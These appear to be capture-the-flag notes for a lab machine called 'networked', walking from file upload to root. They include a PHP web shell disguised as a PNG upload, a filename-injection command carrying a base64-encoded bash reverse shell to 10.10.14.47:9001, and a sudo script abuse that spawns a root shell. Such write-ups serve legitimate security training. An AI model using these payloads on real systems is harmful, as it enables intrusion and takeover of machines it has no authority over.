#### ++ INFO ++
-> We can see the files that we upload in `/upload.php` by inspecting the code in `/photos.php` 
-> We land as `apache` user, we find `/home/guly/check_attack.php`and abuse the script vulnerability
-> We notice guly can execute `/usr/local/sbin/changename.sh` as root and trying random inputs we found the redacted script vulnerability
#### ++ USERS ++
	apache
	guly
	root
	
#### ++ RCE uploading a malicious PNG image ++
	Upload a shell in /upload.php as png file with the following structure:
		"Content-Disposition: form-data; name="myFile"; filename="example.php.png"
		Content-Type: image/png

		PNG
		
		<?php system($_GET['cmd']); ?>"

#### ++ Script abuse by injecting code 1 ++
The script /home/guly/check_attack.php can be abused by injecting code in line:
	`exec("nohup /bin/rm -f $path$value > /dev/null 2>&1 &");`
This can be done creating file with encoded shell:
	`touch "/var/www/html/uploads/a;echo 'L2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzEwLjEwLjE0LjQ3LzkwMDEgMD4mMQo='|base64 -d|bash;10.10.14.47.php"`
Get a shell as gully

#### ++ Script abuse by injecting code 2 ++
Trying random inputs we found that the second word we input is executing as a command
	
```bash
[guly@networked ~]$ sudo /usr/local/sbin/changename.sh
interface NAME:
a b c
interface PROXY_METHOD:
d e f
interface BROWSER_ONLY:
g h i
interface BOOTPROTO:
j k l
/etc/sysconfig/network-scripts/ifcfg-guly: line 4: b: command not found
/etc/sysconfig/network-scripts/ifcfg-guly: line 5: e: command not found
/etc/sysconfig/network-scripts/ifcfg-guly: line 6: h: command not found
/etc/sysconfig/network-scripts/ifcfg-guly: line 7: k: command not found
/etc/sysconfig/network-scripts/ifcfg-guly: line 4: b: command not found
/etc/sysconfig/network-scripts/ifcfg-guly: line 5: e: command not found
/etc/sysconfig/network-scripts/ifcfg-guly: line 6: h: command not found
/etc/sysconfig/network-scripts/ifcfg-guly: line 7: k: command not found
ERROR     : [/etc/sysconfig/network-scripts/ifup-eth] Device guly0 does not seem to be present, delaying initialization.
```
	
So we just input "a /bin/bash" a we get as root
	
```bash
[guly@networked ~]$ sudo /usr/local/sbin/changename.sh
interface NAME:
a /bin/bash
interface PROXY_METHOD:
a
interface BROWSER_ONLY:
a
interface BOOTPROTO:
a
[root@networked network-scripts]# whoami
root
```